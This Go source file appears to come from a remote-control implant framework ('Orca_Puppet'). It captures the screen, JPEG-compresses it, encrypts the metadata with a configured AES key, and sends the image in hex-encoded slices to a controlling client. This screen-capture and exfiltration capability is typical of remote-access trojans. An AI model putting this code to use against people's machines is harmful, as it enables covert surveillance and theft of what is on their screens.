package screenopt

import (
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/config"
	"Orca_Puppet/tools/crypto"
	"Orca_Puppet/tools/util"
	"bytes"
	"encoding/hex"
	"encoding/json"
	"image/jpeg"
	"math"
)

const SliceBytes = 40 * 1024 // 分片大小

type ScreenShotMetaInfo struct {
	Fid        string // 操作文件ID，随机生成的UUID
	SliceNum   int    // 基础分片数量
	SliceSize  int    // 基础分片大小
	RemainSize int    // 剩余分片大小
}

// 屏幕截图
func TakeScreenshotData() ([]byte, error) {
	img, err := Screenshot()
	if err != nil {
		return nil, err
	}
	buf := new(bytes.Buffer)
	err = jpeg.Encode(buf, img, &jpeg.Options{Quality: 40})
	if err != nil {
		return nil, err
	}
	imgData := buf.Bytes()
	return imgData, err
}

// 获取文件片元信息
func GetImgSliceInfo(imgData []byte) (int, int) {
	filesize := len(imgData)                                              // 文件大小
	sliceBytes := SliceBytes                                              // 分片大小
	sliceNum := int(math.Ceil(float64(filesize)/float64(sliceBytes))) - 1 // 分片数量-1
	remainSize := filesize - sliceNum*sliceBytes                          // 最后一个分片大小
	return sliceNum, remainSize
}

// 获取截图元信息，并加密
func GetScreenMetaInfo(imgData []byte) string {
	sliceNum, remainSize := GetImgSliceInfo(imgData)
	sliceSize := SliceBytes
	screenMetaInfo := ScreenShotMetaInfo{
		Fid:        util.GenUUID(),
		SliceNum:   sliceNum,
		SliceSize:  sliceSize,
		RemainSize: remainSize,
	}

	metaInfo, err := json.Marshal(screenMetaInfo)
	if err != nil {
		return ""
	}
	data, _ := crypto.Encrypt(metaInfo, []byte(config.AesKey))
	return data
}

// 发送截图元信息
func SendScreenMetaMsg(clientId, metaData string) common.HttpRetData {
	sendUserId := common.ClientId
	msg := "screenSend"
	data := metaData
	retData := common.SendSuccessMsg(clientId, sendUserId, msg, data)
	return retData
}

// 发送截图分片数据
func SendScreenSliceMsg(clientId string, sliceData []byte) common.HttpRetData {
	sendUserId := common.ClientId
	msg := "screenSliceData"
	data := hex.EncodeToString(sliceData)
	retData := common.SendSuccessMsg(clientId, sendUserId, msg, data)
	return retData
}

// 发送截图数据
func SendScreenData(clientId string, imgData []byte) {
	sliceNum, remainSize := GetImgSliceInfo(imgData)

	sliceSize := SliceBytes
	for i := 0; i < sliceNum; i++ {
		sliceData := imgData[i*sliceSize : (i+1)*sliceSize]
		SendScreenSliceMsg(clientId, sliceData)
	}
	// 处理最后一个分片
	sliceData := imgData[sliceNum*sliceSize : sliceNum*sliceSize+int(remainSize)]
	SendScreenSliceMsg(clientId, sliceData)

}
